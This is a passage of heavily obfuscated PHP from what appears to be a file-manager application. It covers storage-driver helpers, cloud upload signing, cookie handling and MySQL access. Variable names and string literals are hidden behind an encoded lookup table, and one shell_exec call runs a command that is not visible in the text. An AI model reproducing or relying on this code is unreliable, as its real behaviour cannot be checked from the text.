self::systemPath($òÌ±¬¦Æ[1403])); IOHistory::bindEvent(); } public static function systemPath($ŒØ¾Ş¬â) { $Íõ¢¦¶³ =& $_SERVER[¯‘·½]; $ê¾¼Á—® = $Íõ¢¦¶³[1404] . ucfirst($ŒØ¾Ş¬â); $Ë‡’Ëáœ = Model($Íõ¢¦¶³[856])->get($ê¾¼Á—®); if ($Ë‡’Ëáœ) { return $Ë‡’Ëáœ; } if ($ŒØ¾Ş¬â == $Íõ¢¦¶³[192]) { $Ë‡’Ëáœ = self::make(Model($Íõ¢¦¶³[916])->systemRootPathAdd($Íõ¢¦¶³[612])); } else { $Ë‡’Ëáœ = self::systemPath($Íõ¢¦¶³[192]); $Ñ¯ËÅ = self::sourceID($Ë‡’Ëáœ); $Ë‡’Ëáœ = self::make(Model($Íõ¢¦¶³[916])->mkdir($Ñ¯ËÅ, $ŒØ¾Ş¬â)); } Model($Íõ¢¦¶³[856])->set($ê¾¼Á—®, $Ë‡’Ëáœ); return $Ë‡’Ëáœ; } public static function systemFolder($İôÔ†€ä) { $ÅñŒÊ = IO_PATH_SYSTEM_SOURCE . $İôÔ†€ä; $Ÿ´³í¢½ = Cache::get($ÅñŒÊ); if (!$Ÿ´³í¢½) { $ôÉ‰¥ª = IO::infoFullSimple($ÅñŒÊ); if (!$ôÉ‰¥ª) { $Ÿ´³í¢½ = IO::mkdir($ÅñŒÊ, REPEAT_SKIP); } else { $Ÿ´³í¢½ = $ôÉ‰¥ª[$_SERVER[¯‘·½][87]]; } Cache::set($ÅñŒÊ, $Ÿ´³í¢½, 3600 * 10); } return $Ÿ´³í¢½; } public static function defaultDriver() { return Model($_SERVER[¯‘·½][853])->defaultDriver(); } public static function defaultDriverInit() { $Òöàû ø =& $_SERVER[¯‘·½]; static $Ó‚µË = false; if ($Ó‚µË) { return $Ó‚µË; } $­…‡î±á = self::defaultDriver(); $Ó‚µË = IO::init($Òöàû ø[1405] . $­…‡î±á[$Òöàû ø[477]] . $Òöàû ø[1393]); return $Ó‚µË; } public static function fileTypeList() { $ÔìîîÍ =& $_SERVER[¯‘·½]; $®è¹¯ » = $GLOBALS[$ÔìîîÍ[6]][$ÔìîîÍ[1406]]; foreach ($®è¹¯ » as $ÓØš Ô => $¿¸ô‘¹¹) { $éÛ»©† = $ÔìîîÍ[1407] . $ÓØš Ô; $—ƒ«õ‹é = LNG($éÛ»©†); if ($éÛ»©† != $—ƒ«õ‹é) { $®è¹¯ »[$ÓØš Ô][$ÔìîîÍ[32]] = $—ƒ«õ‹é; } } return $®è¹¯ »; } public static function ioFileDriverGet($ƒ±ø¨‡½ = '') { $íàÅÏ÷ =& $_SERVER[¯‘·½]; static $×Áª× = array(); static $ÃÙ¹Œ = array(); static $Ï¢•ˆü˜ = array(); static $Ä”££âÁ = false; if ($Ä”££âÁ === !1) { $Ä”££âÁ = array($íàÅÏ÷[582] => array(), $íàÅÏ÷[669] => array()); $×”°İÊ‘ = Model($íàÅÏ÷[1408])->get(!1, $íàÅÏ÷[1409]); foreach ($×”°İÊ‘ as $äéºÕ•õ => $·³ú¢¤‹) { if (!$·³ú¢¤‹ || $·³ú¢¤‹ == $íàÅÏ÷[12]) { continue; } if (strstr($äéºÕ•õ, $íàÅÏ÷[1410])) { $¼˜îõ‡ = str_replace($íàÅÏ÷[1410], $íàÅÏ÷[12], $äéºÕ•õ); $Ä”££âÁ[$íàÅÏ÷[582]][$¼˜îõ‡] = $·³ú¢¤‹; } else { if (strstr($äéºÕ•õ, $íàÅÏ÷[1411])) { $¼˜îõ‡ = str_replace($íàÅÏ÷[1411], $íàÅÏ÷[12], $äéºÕ•õ); $Ä”££âÁ[$íàÅÏ÷[669]][$¼˜îõ‡] = $·³ú¢¤‹; } } } } $Ëé¢ğœ = self::defaultDriver(); if (!$ƒ±ø¨‡½ || !$Ä”££âÁ[$íàÅÏ÷[582]] && !$Ä”££âÁ[$íàÅÏ÷[669]]) { return $Ëé¢ğœ; } $ª–¥—±ô = self::getPathSourceID($ƒ±ø¨‡½); if (!$ª–¥—±ô) { return $Ëé¢ğœ; } if (isset($×Áª×[$ª–¥—±ô])) { return $×Áª×[$ª–¥—±ô]; } $±®şø¿Â = Model($íàÅÏ÷[916])->sourceInfo($ª–¥—±ô); $İİñìÑÙ = $±®şø¿Â[$íàÅÏ÷[573]]; $è¦ÓÌû¿ = array(); if (!$±®şø¿Â) { return $Ëé¢ğœ; } if ($±®şø¿Â[$íàÅÏ÷[191]] == $íàÅÏ÷[91]) { if (isset($Ï¢•ˆü˜[$İİñìÑÙ])) { return $Ï¢•ˆü˜[$İİñìÑÙ]; } if (isset($Ä”££âÁ[$íàÅÏ÷[669]][$İİñìÑÙ])) { $ôà—½·­ = Model($íàÅÏ÷[853])->driverInfo($Ä”££âÁ[$íàÅÏ÷[669]][$İİñìÑÙ]); $Ëé¢ğœ = $ôà—½·­ ? $ôà—½·­ : $Ëé¢ğœ; $Ï¢•ˆü˜[$İİñìÑÙ] = $Ëé¢ğœ; $×Áª×[$ª–¥—±ô] = $Ëé¢ğœ; return $Ëé¢ğœ; } $è¦ÓÌû¿ = self::groupParentUser($İİñìÑÙ); } else { if ($±®şø¿Â[$íàÅÏ÷[191]] == $íàÅÏ÷[512]) { $ˆ½øáßì = Model($íàÅÏ÷[1412])->getInfo($İİñìÑÙ); if ($ˆ½øáßì) { $è¦ÓÌû¿ = explode($íàÅÏ÷[50], trim($ˆ½øáßì[$íàÅÏ÷[588]], $íàÅÏ÷[50])); $è¦ÓÌû¿ = array_remove_value($è¦ÓÌû¿, $íàÅÏ÷[231]); $è¦ÓÌû¿[] = $İİñìÑÙ; $è¦ÓÌû¿ = array_reverse($è¦ÓÌû¿); } } } foreach ($è¦ÓÌû¿ as $ş­™£í) { if (!isset($Ä”££âÁ[$íàÅÏ÷[582]][$ş­™£í])) { continue; } if (isset($ÃÙ¹Œ[$ş­™£í])) { return $ÃÙ¹Œ[$ş­™£í]; } $ôà—½·­ = Model($íàÅÏ÷[853])->driverInfo($Ä”££âÁ[$íàÅÏ÷[582]][$ş­™£í]); $Ëé¢ğœ = $ôà—½·­ ? $ôà—½·­ : $Ëé¢ğœ; $ÃÙ¹Œ[$ş­™£í] = $Ëé¢ğœ; break; } if ($±®şø¿Â[$íàÅÏ÷[191]] == $íàÅÏ÷[91]) { $Ï¢•ˆü˜[$İİñìÑÙ] = $Ëé¢ğœ; } $×Áª×[$ª–¥—±ô] = $Ëé¢ğœ; return $Ëé¢ğœ; } private static function getPathSourceID($Â—ÇŒ¨‘) { $ñ’ÌÂñç =& $_SERVER[¯‘·½]; static $ ƒİ›îÆ = array(); if (!$Â—ÇŒ¨‘) { return $ñ’ÌÂñç[12]; } $ì¬¾ëáŠ = substr($Â—ÇŒ¨‘, 0, strlen($ñ’ÌÂñç[485])) == $ñ’ÌÂñç[485]; $—êñ«Ï« = substr($Â—ÇŒ¨‘, 0, strlen($ñ’ÌÂñç[1380])) == $ñ’ÌÂñç[1380]; $»€¼ĞæŞ = substr($Â—ÇŒ¨‘, 0, strlen($ñ’ÌÂñç[1381])) == $ñ’ÌÂñç[1381]; if (!$ì¬¾ëáŠ && !$—êñ«Ï« && !$»€¼ĞæŞ) { return $ñ’ÌÂñç[12]; } $©’³¡ñÛ = self::parse($Â—ÇŒ¨‘); $Øª²ì¦è = $©’³¡ñÛ[$ñ’ÌÂñç[1274]]; if ($ì¬¾ëáŠ) { return $©’³¡ñÛ[$ñ’ÌÂñç[477]]; } if (isset($ ƒİ›îÆ[$Øª²ì¦è])) { $à„ËøÈó = $ ƒİ›îÆ[$Øª²ì¦è]; } else { $à„ËøÈó = IO::init($Øª²ì¦è); $ ƒİ›îÆ[$Øª²ì¦è] = $à„ËøÈó; } if (isset($à„ËøÈó->pathParse[$ñ’ÌÂñç[1277]])) { return $à„ËøÈó->pathParse[$ñ’ÌÂñç[1277]]; } return $ñ’ÌÂñç[12]; } private static function groupParentUser($Öó¿—°Ñ) { $Ëêšæ¸Õ =& $_SERVER[¯‘·½]; $ñËëäŸ‚ = Model($Ëêšæ¸Õ[601])->getInfo($Öó¿—°Ñ); if (!$ñËëäŸ‚) { return array(); } $®‚Á¶–¼ = array_to_keyvalue($ñËëäŸ‚[$Ëêšæ¸Õ[1413]], $Ëêšæ¸Õ[12], $Ëêšæ¸Õ[1414]); $õğÚ’– = array(); foreach ($ñËëäŸ‚[$Ëêšæ¸Õ[1413]] as $Ÿ¢Õºõø) { $õğÚ’–[] = $Ÿ¢Õºõø[$Ëêšæ¸Õ[1414]]; $°øëÛÇ = explode($Ëêšæ¸Õ[50], trim($Ÿ¢Õºõø[$Ëêšæ¸Õ[588]], $Ëêšæ¸Õ[50])); $°øëÛÇ = array_remove_value($°øëÛÇ, $Ëêšæ¸Õ[231]); $°øëÛÇ = array_reverse($°øëÛÇ); $õğÚ’– = array_merge($õğÚ’–, $°øëÛÇ); } return array_unique($õğÚ’–); } public static function diskList($–Ïä½¯­ = true) { $ë„²‹œ¶ = $_SERVER[¯‘·½][1415]; if ($–Ïä½¯­) { $¼áîÎ¤… = Cache::get($ë„²‹œ¶); if (is_array($¼áîÎ¤…)) { return $¼áîÎ¤…; } } $¼áîÎ¤… = self::diskListGet(); Cache::set($ë„²‹œ¶, $¼áîÎ¤…, 60); return $¼áîÎ¤…; } public static function diskListGet() { $ıß¦ˆƒ =& $_SERVER[¯‘·½]; $Æõ²·ß‡ = array(); if ($GLOBALS[$ıß¦ˆƒ[6]][$ıß¦ˆƒ[1416]] == $ıß¦ˆƒ[1417]) { $í¬®ØŞ = $ıß¦ˆƒ[1418]; for ($‘ş¥‚¶ñ = 0; $‘ş¥‚¶ñ < strlen($í¬®ØŞ); $‘ş¥‚¶ñ++) { $ÀıÀ’’ = $í¬®ØŞ[$‘ş¥‚¶ñ] . $ıß¦ˆƒ[1419]; if (file_exists($ÀıÀ’’)) { $Æõ²·ß‡[] = $ÀıÀ’’; } } return $Æõ²·ß‡; } if (!function_exists($ıß¦ˆƒ[101])) { $Æõ²·ß‡[] = $ıß¦ˆƒ[927]; return $Æõ²·ß‡; } $‘°óëàˆ = explode($ıß¦ˆƒ[288], shell_exec($ıß¦ˆƒ[1420])); array_shift($‘°óëàˆ); array_pop($‘°óëàˆ); $½çİîø = array($ıß¦ˆƒ[1421], $ıß¦ˆƒ[1422], $ıß¦ˆƒ[1423], $ıß¦ˆƒ[1424], $ıß¦ˆƒ[1425], $ıß¦ˆƒ[1426], $ıß¦ˆƒ[1427], $ıß¦ˆƒ[1428]); foreach ($‘°óëàˆ as $‡é…ïƒ¼) { $¡•Ô½úÑ = preg_split($ıß¦ˆƒ[1429], $‡é…ïƒ¼); $ÀıÀ’’ = $¡•Ô½úÑ[count($¡•Ô½úÑ) - 1]; if (!strstr($¡•Ô½úÑ[0], $ıß¦ˆƒ[1430]) || !$ÀıÀ’’) { continue; } $ğ¿›ì“æ = rtrim($ÀıÀ’’, $ıß¦ˆƒ[8]) . $ıß¦ˆƒ[8]; if (in_array($ğ¿›ì“æ, $½çİîø)) { continue; } $Æõ²·ß‡[] = $ğ¿›ì“æ; } return $Æõ²·ß‡; } public static function isSameDisk($È†°ÈÃ“, $‹è»‹€) { $š‹Ñé¹â =& $_SERVER[¯‘·½]; if ($GLOBALS[$š‹Ñé¹â[6]][$š‹Ñé¹â[1416]] == $š‹Ñé¹â[1417]) { return strtolower(substr($È†°ÈÃ“, 0, 1)) == strtolower(substr($‹è»‹€, 0, 1)); } $ÀÒİË¿Ö = stat($È†°ÈÃ“); $°İì ï´ = stat($‹è»‹€); if ($ÀÒİË¿Ö === !1 || $°İì ï´ === !1) { return !1; } return $ÀÒİË¿Ö[$š‹Ñé¹â[1431]] === $°İì ï´[$š‹Ñé¹â[1431]]; $Œ×Ş‹Å = self::diskList(); $—àéÜÌæ = !1; $ƒ¢æ¯· = !1; sort($Œ×Ş‹Å); $Œ×Ş‹Å = array_reverse($Œ×Ş‹Å); $È†°ÈÃ“ = rtrim($È†°ÈÃ“, $š‹Ñé¹â[8]) . $š‹Ñé¹â[8]; $‹è»‹€ = rtrim($‹è»‹€, $š‹Ñé¹â[8]) . $š‹Ñé¹â[8]; foreach ($Œ×Ş‹Å as $ºòÔËø) { $Ô÷µ­¦¹ = strlen($ºòÔËø); if (!$—àéÜÌæ && substr($È†°ÈÃ“, 0, $Ô÷µ­¦¹) == $ºòÔËø) { $—àéÜÌæ = $ºòÔËø; } if (!$ƒ¢æ¯· && substr($‹è»‹€, 0, $Ô÷µ­¦¹) == $ºòÔËø) { $ƒ¢æ¯· = $ºòÔËø; } if ($—àéÜÌæ && $ƒ¢æ¯·) { break; } } return $—àéÜÌæ === $ƒ¢æ¯·; } public static function transferType($×òï†Æ, $²”Ÿş•„) { $«ŸàÀ¼­ =& $_SERVER[¯‘·½]; $‡º³Õ³ = self::driverType($×òï†Æ); $®Øï®’² = self::driverType($²”Ÿş•„); if ($‡º³Õ³[$«ŸàÀ¼­[33]] == $®Øï®’²[$«ŸàÀ¼­[33]] && $‡º³Õ³[$«ŸàÀ¼­[1432]] == $®Øï®’²[$«ŸàÀ¼­[1432]]) { return $«ŸàÀ¼­[1433]; } if ($‡º³Õ³[$«ŸàÀ¼­[33]] == $«ŸàÀ¼­[961] && $®Øï®’²[$«ŸàÀ¼­[33]] == $«ŸàÀ¼­[109]) { return $«ŸàÀ¼­[1303]; } if ($‡º³Õ³[$«ŸàÀ¼­[33]] == $«ŸàÀ¼­[109] && $®Øï®’²[$«ŸàÀ¼­[33]] == $«ŸàÀ¼­[961]) { return $«ŸàÀ¼­[110]; } return $«ŸàÀ¼­[1434]; } public static function driverType($ü€Æ–ÅŸ) { $İ¾Ë¸“ =& $_SERVER[¯‘·½]; $‡ÕÃêÓ = str_replace($İ¾Ë¸“[1435], $İ¾Ë¸“[12], strtolower($ü€Æ–ÅŸ->getType())); if ($‡ÕÃêÓ == $İ¾Ë¸“[843] || $‡ÕÃêÓ == $İ¾Ë¸“[1436] || $‡ÕÃêÓ == $İ¾Ë¸“[1437]) { $§ÅÀòµŞ = self::ioFileDriverGet($İ¾Ë¸“[485] . $ü€Æ–ÅŸ->pathParse[$İ¾Ë¸“[1277]] . $İ¾Ë¸“[404]); $ü€Æ–ÅŸ = IO::init($İ¾Ë¸“[1405] . $§ÅÀòµŞ[$İ¾Ë¸“[477]] . $İ¾Ë¸“[1393]); } else { if ($‡ÕÃêÓ == $İ¾Ë¸“[1313] || $‡ÕÃêÓ == $İ¾Ë¸“[1438]) { $ü€Æ–ÅŸ = IO::init($ü€Æ–ÅŸ->pathParse[$İ¾Ë¸“[1254]]); } } $òšÀçÇ¡ = $ü€Æ–ÅŸ->path; $‡ÕÃêÓ = str_replace($İ¾Ë¸“[1435], $İ¾Ë¸“[12], strtolower($ü€Æ–ÅŸ->getType())); if ($‡ÕÃêÓ == $İ¾Ë¸“[109]) { return array($İ¾Ë¸“[33] => $İ¾Ë¸“[109], $İ¾Ë¸“[1432] => $İ¾Ë¸“[12], $İ¾Ë¸“[87] => $òšÀçÇ¡, $İ¾Ë¸“[98] => $ü€Æ–ÅŸ); } return array($İ¾Ë¸“[33] => $İ¾Ë¸“[961], $İ¾Ë¸“[1432] => $ü€Æ–ÅŸ->pathDriver, $İ¾Ë¸“[87] => $òšÀçÇ¡, $İ¾Ë¸“[98] => $ü€Æ–ÅŸ); } public static function pathDriverType($äŒú‚¼¦) { return $äŒú‚¼¦ ? self::driverType(IO::init($äŒú‚¼¦)) : !1; } public static function pathDriverLocal($ÛÀÒ×Åá) { $’Æ‰É´ï =& $_SERVER[¯‘·½]; $„£‰‰È¶ = $ÛÀÒ×Åá ? self::driverType(IO::init($ÛÀÒ×Åá)) : !1; return strtolower($„£‰‰È¶[$’Æ‰É´ï[33]]) == $’Æ‰É´ï[109] ? !0 : !1; } public static function allowCover($ˆ¡ûşƒŞ, $¡™×öóƒ = true) { $ê°İâ’ê =& $_SERVER[¯‘·½]; if (is_string($ˆ¡ûşƒŞ)) { $ˆ¡ûşƒŞ = IO::info($ˆ¡ûşƒŞ); } if (!$ˆ¡ûşƒŞ || $ˆ¡ûşƒŞ[$ê°İâ’ê[33]] == $ê°İâ’ê[78] || $ˆ¡ûşƒŞ[$ê°İâ’ê[79]] <= 100) { return !1; } if (isset($ˆ¡ûşƒŞ[$ê°İâ’ê[1439]]) || !$ˆ¡ûşƒŞ[$ê°İâ’ê[87]]) { return !1; } if (isset($ˆ¡ûşƒŞ[$ê°İâ’ê[235]]) && !$ˆ¡ûşƒŞ[$ê°İâ’ê[235]]) { return !1; } static $²äµ«ˆØ = false; if (!$²äµ«ˆØ || !$¡™×öóƒ) { $…èÊ·õ· = self::driverType(IO::init($ˆ¡ûşƒŞ[$ê°İâ’ê[87]])); $”Îê“ƒ¯ = $…èÊ·õ·[$ê°İâ’ê[98]]; $²äµ«ˆØ = $ê°İâ’ê[197]; if ($…èÊ·õ·[$ê°İâ’ê[33]] == $ê°İâ’ê[109]) { $²äµ«ˆØ = $ê°İâ’ê[1440]; } if ($…èÊ·õ·[$ê°İâ’ê[98]] && is_array($…èÊ·õ·[$ê°İâ’ê[98]]->config)) { $À˜Åµİ = $…èÊ·õ·[$ê°İâ’ê[98]]->config; if (isset($À˜Åµİ[$ê°İâ’ê[1441]]) && $À˜Åµİ[$ê°İâ’ê[1441]]) { $²äµ«ˆØ = $ê°İâ’ê[1440]; } } $´÷—ÉÍ‚ = KodIO::defaultDriver(); if (strtolower($´÷—ÉÍ‚[$ê°İâ’ê[98]]) == $ê°İâ’ê[109] && is_array($´÷—ÉÍ‚[$ê°İâ’ê[6]])) { $½µÎ˜æ² = $´÷—ÉÍ‚[$ê°İâ’ê[6]][$ê°İâ’ê[1286]]; if (substr($½µÎ˜æ², 0, 2) == $ê°İâ’ê[1442]) { $½µÎ˜æ² = str_replace($ê°İâ’ê[1442], BASIC_PATH, $½µÎ˜æ²); } $½µÎ˜æ² = str_replace($ê°İâ’ê[257], $ê°İâ’ê[8], $½µÎ˜æ²); if (substr($ˆ¡ûşƒŞ[$ê°İâ’ê[87]], 0, strlen($½µÎ˜æ²)) == $½µÎ˜æ²) { $²äµ«ˆØ = $ê°İâ’ê[197]; } } } return $²äµ«ˆØ == $ê°İâ’ê[1440] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($Á›¤Éåˆ) { parent::__construct($Á›¤Éåˆ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($œï¦Úª) { parent::__construct($œï¦Úª); $this->setSignVersion($_SERVER[¯‘·½][250]); } public function uploadFormData($³Ø‘·å, $†à—Ÿ¯Ü = 3600) { $æüí­Ù =& $_SERVER[¯‘·½]; $í†™§áÆ = $æüí­Ù[232]; $Ô²ç¥çÔ = $æüí­Ù[1443]; $¸ş‘Â–ë = $æüí­Ù[264]; $Ó‚¬û–« = gmdate($æüí­Ù[1444], time() + $†à—Ÿ¯Ü); $ñ¿ŞÀ…£ = (string) time() . $æüí­Ù[74] . (string) (time() + $†à—Ÿ¯Ü); $çôîş«“ = array($æüí­Ù[265] => $Ó‚¬û–«, $æüí­Ù[268] => array(array($æüí­Ù[309] => $í†™§áÆ), array($æüí­Ù[269] => $this->bucket), array($æüí­Ù[270], $æüí­Ù[271], $æüí­Ù[12]), array($æüí­Ù[273] => $¸ş‘Â–ë), array($æüí­Ù[1445] => $Ô²ç¥çÔ), array($æüí­Ù[1446] => $this->accessKey), array($æüí­Ù[1447] => $ñ¿ŞÀ…£))); $çôîş«“ = json_encode($çôîş«“); $œÜ‹²â = hash_hmac($æüí­Ù[1443], $ñ¿ŞÀ…£, $this->secret); $ÑÈÀÔ„ì = sha1($çôîş«“); $‹Ş®˜àì = hash_hmac($æüí­Ù[1443], $ÑÈÀÔ„ì, $œÜ‹²â); $¿õˆ€İÉ = array($æüí­Ù[309] => $í†™§áÆ, $æüí­Ù[273] => $¸ş‘Â–ë, $æüí­Ù[280] => base64_encode($çôîş«“), $æüí­Ù[1445] => $Ô²ç¥çÔ, $æüí­Ù[1446] => $this->accessKey, $æüí­Ù[1448] => $ñ¿ŞÀ…£, $æüí­Ù[1449] => $‹Ş®˜àì, $æüí­Ù[209] => $this->getHost()); return $¿õˆ€İÉ; } public function fileOutImage($Ô„ó†®®, $Ìã¿‚­ = 250) { $ó¤ğ¬¿ =& $_SERVER[¯‘·½]; if ($this->size($Ô„ó†®®) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Ô„ó†®®, $Ìã¿‚­); } $Ÿõ¥è˜ = $this->link($Ô„ó†®®); $Ÿõ¥è˜ .= $ó¤ğ¬¿[1450] . $Ìã¿‚­ . $ó¤ğ¬¿[1451]; $this->fileOutLink($Ÿõ¥è˜); } } goto c«ŠÙœ×ÇÌ; C‰–ªà´Œ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($åãÚ¤“ = '', $ ª£êÛ = 0) { if (is_string($åãÚ¤“) && $åãÚ¤“ != $_SERVER[¯‘·½][12]) { $this->prefix = $åãÚ¤“; } if (is_numeric($ ª£êÛ) && $ ª£êÛ > 0) { $this->expire = $ ª£êÛ; } } public static function getInstance() { static $êëÈ¯¹×; if ($êëÈ¯¹× === null) { $êëÈ¯¹× = new self(); } return $êëÈ¯¹×; } private static $cookieDisable = false; public static function disable($˜Æ›ŞÆª) { self::$cookieDisable = $˜Æ›ŞÆª; } private static $sameCookieSet = array(); public static function set($«Ä³É”à, $ù¿š™Œ„, $èØ°¤÷ = 0, $È±œÔ ‡ = false, $¸¹ñšíÊ = false) { $¶ğ¤¤¹Ä =& $_SERVER[¯‘·½]; if (self::$cookieDisable) { return; } if (!$èØ°¤÷) { $èØ°¤÷ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$«Ä³É”à]) && self::$sameCookieSet[$«Ä³É”à] == $ù¿š™Œ„ . $èØ°¤÷) { return; } self::$sameCookieSet[$«Ä³É”à] = $ù¿š™Œ„ . $èØ°¤÷; if (!$¸¹ñšíÊ) { $¸¹ñšíÊ = str_replace(HOST, $¶ğ¤¤¹Ä[12], APP_HOST); $¸¹ñšíÊ = _get($GLOBALS, $¶ğ¤¤¹Ä[979], $¸¹ñšíÊ); } $»ç™ÎÓŸ = $¶ğ¤¤¹Ä[12]; setcookie($«Ä³É”à, $ù¿š™Œ„, time() + $èØ°¤÷, $¶ğ¤¤¹Ä[8] . trim($¸¹ñšíÊ, $¶ğ¤¤¹Ä[8]) . $»ç™ÎÓŸ, !1, !1, $È±œÔ ‡); } public static function setSafe($Ñúâ÷ª, $¸°ôÕâŠ, $¼º×®…” = 0) { self::set($Ñúâ÷ª, $¸°ôÕâŠ, $¼º×®…”, !0); } public static function get($İº“˜àÅ) { static $ÁŞ‰Ğ“í = false; if (!$ÁŞ‰Ğ“í) { self::initHeaderCookie(); $ÁŞ‰Ğ“í = !0; } return isset($_COOKIE[$İº“˜àÅ]) ? $_COOKIE[$İº“˜àÅ] : !1; } private static function initHeaderCookie() { $üÆ¾¨– =& $_SERVER[¯‘·½]; if (!isset($_SERVER[$üÆ¾¨–[980]]) || !$_SERVER[$üÆ¾¨–[980]]) { return; } $–¹ˆÃ‚ = explode($üÆ¾¨–[74], $_SERVER[$üÆ¾¨–[980]]); foreach ($–¹ˆÃ‚ as $ ¾ìÙ¨—) { $ ¾ìÙ¨— = explode($üÆ¾¨–[508], $ ¾ìÙ¨—); if (count($ ¾ìÙ¨—) != 2 || !isset($ ¾ìÙ¨—[1])) { continue; } $_COOKIE[trim($ ¾ìÙ¨—[0])] = trim($ ¾ìÙ¨—[1]); } } public static function remove($­—é—Ïé, $ô£Ù¾Ç = false) { unset($_COOKIE[$­—é—Ïé]); self::set($­—é—Ïé, $_SERVER[¯‘·½][12], 1, $ô£Ù¾Ç); } } class DbMysql extends Db { public function __construct($€‡¨òŒÆ = '') { $Óâ––ß =& $_SERVER[¯‘·½]; if (!extension_loaded($Óâ––ß[894])) { think_exception(think_lang($Óâ––ß[14]) . $Óâ––ß[981]); } if (!empty($€‡¨òŒÆ)) { $this->config = $€‡¨òŒÆ; if (empty($this->config[$Óâ––ß[17]])) { $this->config[$Óâ––ß[17]] = $Óâ––ß[12]; } } } public function connect($»–˜¬ÕÄ = '', $Ì´Şª– = 0, $õĞÉ»ÑÉ = false) { $íÕ´èÚ¼ =& $_SERVER[¯‘·½]; if (!isset($this->linkID[$Ì´Şª–])) { if (empty($»–˜¬ÕÄ)) { $»–˜¬ÕÄ = $this->config; } $½‡óáø½ = $»–˜¬ÕÄ[$íÕ´èÚ¼[982]] . ($»–˜¬ÕÄ[$íÕ´èÚ¼[983]] ? "\x3a{$»–˜¬ÕÄ[$íÕ´èÚ¼[983]]}" : $íÕ´èÚ¼[12]); $‡ÑÄ–¼‹ = !empty($»–˜¬ÕÄ[$íÕ´èÚ¼[17]][$íÕ´èÚ¼[18]]) ? $»–˜¬ÕÄ[$íÕ´èÚ¼[17]][$íÕ´èÚ¼[18]] : $this->pconnect; if ($‡ÑÄ–¼‹) { $this->linkID[$Ì´Şª–] = mysql_pconnect($½‡óáø½, $»–˜¬ÕÄ[$íÕ´èÚ¼[984]], $»–˜¬ÕÄ[$íÕ´èÚ¼[985]], 131072); } else { $this->linkID[$Ì´Şª–] = mysql_connect($½‡óáø½, $»–˜¬ÕÄ[$íÕ´èÚ¼[984]], $»–˜¬ÕÄ[$íÕ´èÚ¼[985]], !0, 131072); } if (!$this->linkID[$Ì´Şª–] || !empty($»–˜¬ÕÄ[$íÕ´èÚ¼[21]]) && !mysql_select_db($»–˜¬ÕÄ[$íÕ´èÚ¼[21]], $this->linkID[$Ì´Şª–])) { think_exception(mysql_error()); } $’«Ù¢ìø = mysql_get_server_info($this->linkID[$Ì´Şª–]); mysql_query($íÕ´èÚ¼[986] . think_config($íÕ´èÚ¼[987]) . $íÕ´èÚ¼[58], $this->linkID[$Ì´Şª–]); if ($’«Ù¢ìø > $íÕ´èÚ¼[988]) { mysql_query($íÕ´èÚ¼[989], $this->linkID[$Ì´Şª–]); } $this->connected = !0; if (1 != think_config($íÕ´èÚ¼[22])) { unset($this->config); } } return $this->linkID[$Ì´Şª–]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¢Ğ˜ÙäÛ) { $ŠâÄÓ ê =& $_SERVER[¯‘·½]; if (0 === stripos($¢Ğ˜ÙäÛ, $ŠâÄÓ ê[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¢Ğ˜ÙäÛ; if ($this->queryID) { $this->free(); } think_action_status($ŠâÄÓ ê[23], 1); think_status($ŠâÄÓ ê[24]); $this->queryID = mysql_query($¢Ğ˜ÙäÛ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ŞşªæÔ®) { $•ôÖãÀ¥ =& $_SERVER[¯‘·½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŞşªæÔ®; if ($this->queryID) { $this->free(); } think_action_status($•ôÖãÀ¥[25], 1); think_status($•ôÖãÀ¥[24]); $ÅŸî¹àµ = mysql_query($ŞşªæÔ®, $this->_linkID); $this->debug(); if (!1 === $ÅŸî¹àµ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¯‘·½][990], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Åä½¤éŞ = mysql_query($_SERVER[¯‘·½][991], $this->_linkID); $this->transTimes = 0; if (!$Åä½¤éŞ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÁËå¼ = mysql_query($_SERVER[¯‘·½][992], $this->_linkID); $this->transTimes = 0; if (!$ÁËå¼) { $this->error(); return !1; } } return !0; } private function getAll() { $Œ´“¥Çœ = array(); if ($this->numRows > 0) { while ($·ºËÈ = mysql_fetch_assoc($this->queryID)) { $Œ´“¥Çœ[] = $·ºËÈ; } mysql_data_seek($this->queryID, 0); } return $Œ´“¥Çœ; } public function getFields($ä¾¬ğ¬É) { $¼ä˜–±å =& $_SERVER[¯‘·½]; $óÅ›’³æ = $this->query($¼ä˜–±å[993] . $this->parseKey($ä¾¬ğ¬É)); $Ó­ˆ­¾Ü = array(); if ($óÅ›’³æ) { foreach ($óÅ›’³æ as $ßâ¦¹‘¥ => $ÜàÒîˆ¥) { $Ó­ˆ­¾Ü[$ÜàÒîˆ¥[$¼ä˜–±å[31]]] = array($¼ä˜–±å[32] => $ÜàÒîˆ¥[$¼ä˜–±å[31]], $¼ä˜–±å[33] => $ÜàÒîˆ¥[$¼ä˜–±å[34]], $¼ä˜–±å[35] => (bool) (strtoupper($ÜàÒîˆ¥[$¼ä˜–±å[36]]) === $¼ä˜–±å[994]), $¼ä˜–±å[37] => $ÜàÒîˆ¥[$¼ä˜–±å[38]], $¼ä˜–±å[39] => strtolower($ÜàÒîˆ¥[$¼ä˜–±å[40]]) == $¼ä˜–±å[41], $¼ä˜–±å[42] => strtolower($ÜàÒîˆ¥[$¼ä˜–±å[43]]) == $¼ä˜–±å[44]); } } return $Ó­ˆ­¾Ü; } public function getTables($Ó­ş¸Ú˜ = '') { $øÑ¨×ÌŠ =& $_SERVER[¯‘·½]; if (!empty($Ó­ş¸Ú˜)) { $ëôâ¥ = $øÑ¨×ÌŠ[995] . $Ó­ş¸Ú˜ . 